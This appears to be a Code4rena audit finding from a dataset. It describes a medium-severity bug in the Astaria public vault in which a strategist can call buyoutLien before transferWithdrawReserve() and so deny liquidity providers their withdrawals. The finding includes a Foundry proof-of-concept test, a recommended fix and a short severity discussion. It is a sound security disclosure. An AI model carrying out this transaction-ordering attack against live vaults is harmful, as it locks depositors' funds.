# [M] Public vault owner

## Summary
Severity: Medium
Contest weight: 0.5228
Dataset id: 17912
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The vulnerability resides in the public vault’s withdrawal lifecycle. In the current design the function that moves available funds from the vault to the withdraw proxy – transferWithdrawReserve() – is called only after a liquidity provider signals a withdrawal and after the epoch has been processed. However, the contract does not enforce that this transfer must happen before a strategist can invoke buyoutLien, a function that refinances an existing lien by purchasing it from the vault. Because the ordering check is missing, a strategist who controls the vault (the public vault owner) can front‑run the withdrawal by calling buyoutLien as soon as funds become available, but before transferWithdrawReserve() is executed. The buyout consumes the reserve that would otherwise be sent to the withdraw proxy, leaving the proxy with little or no balance. The withdraw proxy then waits for funds that will never arrive, effectively blocking the liquidity provider’s withdrawal. The attack can be repeated indefinitely; the only mechanism that could release the stuck funds is a liquidation, but the strategist can avoid liquidation by only buying out liens from vaults they control and lending to themselves. This creates a denial‑of‑service or griefing scenario where the strategist, by abusing transaction ordering, can lock all user deposits and appear to own the entire public vault balance. From a user’s perspective the UI shows a pending withdrawal, the user expects to receive the full amount they deposited, but the withdraw proxy returns zero or a fraction of the expected ether, leading to confusion and loss of confidence. The issue was discovered during a Code4rena audit when a test reproduced the scenario: after a buyoutLien call placed before transferWithdrawReserve(), the withdraw proxy balance was less than one third of the expected 60 ether. The problem is subtle because buyoutLien is a legitimate operation and the missing prerequisite call is not obvious in the contract’s flow, making the bug hard to spot without targeted testing. The appropriate mitigation is to enforce the execution of transferWithdrawReserve() (or a state flag indicating that the reserve has been transferred) before any buyoutLien can be performed, mirroring the existing commitLien flow. This change restores the intended accounting invariant that funds earmarked for withdrawal are locked and cannot be re‑allocated by a refinancing transaction, thereby preventing the strategist from permanently denying withdrawals.

## Proof of Concept
Before commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien.

As soon as there’s fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund.

The only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.

Consider the following test. Even though there is enough fund in the vault for the liquidity provider’s withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien().

```solidity
pragma solidity =0.8.17;

import "forge-std/Test.sol";

import {Authority} from "solmate/auth/Auth.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {
  MultiRolesAuthority
} from "solmate/auth/authorities/MultiRolesAuthority.sol";

import {ERC721} from "gpl/ERC721.sol";
import {SafeCastLib} from "gpl/utils/SafeCastLib.sol";

import {IAstariaRouter, AstariaRouter} from "../AstariaRouter.sol";
import {VaultImplementation} from "../VaultImplementation.sol";
import {PublicVault} from "../PublicVault.sol";
import {TransferProxy} from "../TransferProxy.sol";
import {WithdrawProxy} from "../WithdrawProxy.sol";

import {Strings2} from "./utils/Strings2.sol";

import "./TestHelpers.t.sol";
import {OrderParameters} from "seaport/lib/ConsiderationStructs.sol";

contract AstariaTest is TestHelpers {
  using FixedPointMathLib for uint256;
  using CollateralLookup for address;
  using SafeCastLib for uint256;

  event NonceUpdated(uint256 nonce);
  event VaultShutdown();

  function testBuyoutBeforeWithdraw() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 7 days
    });
    _lendToVault(
      Lender({addr: address(1), amountToLend: 60 ether}),
      publicVault
    );

    address publicVault2 = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 7 days
    });
    _lendToVault(
      Lender({addr: address(1), amountToLend: 60 ether}),
      publicVault2
    );

    (, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 40 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 3 days);

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: publicVault2,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: ILienToken.Details({
        maxAmount: 50 ether,
        rate: (uint256(1e16) * 70) / (365 days),
        duration: 25 days,
        maxPotentialDebt: 53 ether,
        liquidationInitialAsk: 500 ether
      }),
      amount: 10 ether,
      stack: stack
    });

    _signalWithdraw(address(1), publicVault2);
    _warpToEpochEnd(publicVault2);
    PublicVault(publicVault2).processEpoch();

    VaultImplementation(publicVault2).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
    
    PublicVault(publicVault2).transferWithdrawReserve();

    WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);

    assertTrue(WETH9.balanceOf(address(withdrawProxy)) < 20 ether);
    
  }
}
```

## Recommendation
Enforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien).

@androolloyd - should this still be high severity? This may be a strategist trust issue, but it is more malicious than just writing bad loan terms.

Since this is more of a strategist trust issue, we think this would make more sense as medium severity. Even with the fix, the issue of malicious refinancing would still partially exist.

I do agree with Medium severity, considering it is a griefing attack by the strategist.
